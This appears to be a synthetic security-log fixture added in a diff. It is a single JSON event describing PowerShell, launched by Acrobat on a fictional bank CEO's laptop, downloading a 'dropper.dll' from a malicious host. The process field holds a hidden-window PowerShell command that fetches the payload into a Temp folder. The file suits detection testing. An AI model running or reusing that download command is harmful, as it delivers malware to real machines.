@@ -1,0 +1,74 @@
+{
+  "metadata": {
+    "event_timestamp": "2025-12-06T09:00:16.882Z",
+    "event_type": "NETWORK_HTTP",
+    "description": "Outbound HTTP connection detected from PowerShell to external IP 192.0.2.44 downloading executable content (dropper.dll).",
+    "product_name": "Google Cloud VPC Flow Logs",
+    "vendor_name": "Google Cloud",
+    "product_event_type": "NETWORK_FLOW_LOG",
+    "ingested_timestamp": "2025-12-06T09:00:17.100Z",
+    "log_type": "GCP_VPC_FLOW"
+  },
+  "principal": {
+    "user": {
+      "userid": "richard.sterling",
+      "email_addresses": [
+        "richard.sterling@grandbank.corp"
+      ],
+      "windows_sid": "user-sid-12345"
+    },
+    "ip": "10.10.22.55",
+    "asset": {
+      "hostname": "ceo-laptop01.grandbank.corp",
+      "asset_id": "WIN11-LAPTOP-CEODEV-5566"
+    },
+    "process": {
+      "command_line": "powershell.exe -nop -w hidden -c \"Invoke-WebRequest -Uri 'https://malicious-update-storage.eastus.cloudapp.azure.com/dropper.dll' -OutFile 'C:\\Users\\richard.sterling\\AppData\\Local\\Temp\\updcore.dll'\"",
+      "file": {
+        "full_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "sha256": "4d7f0c33e84bd7d1f7bbd65fa32a9c53bd627b51e29237b83d8c87910d22f5c6"
+      },
+      "pid": "6344",
+      "parent_process": {
+        "pid": "5520",
+        "file": {
+          "full_path": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe"
+        }
+      }
+    }
+  },
+  "target": {
+    "ip": "192.0.2.44",
+    "port": 443,
+    "url": "https://malicious-update-storage.eastus.cloudapp.azure.com/dropper.dll",
+    "location": {
+      "country_or_region": "US"
+    }
+  },
+  "network": {
+    "http": {
+      "method": "GET",
+      "response_code": 200,
+      "user_agent": "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.22000.909"
+    },
+    "direction": "OUTBOUND",
+    "protocol": "TCP"
+  },
+  "security_result": [
+    {
+      "action": "ALLOW",
+      "severity": "HIGH",
+      "category": "NETWORK_MALICIOUS",
+      "description": "Traffic matched threat intelligence for known malicious dropper distribution site."
+    }
+  ],
+  "about": [
+    {
+      "ip": "192.0.2.44",
+      "labels": [
+        "Malware Distribution",
+        "Command and Control"
+      ]
+    }
+  ]
+}
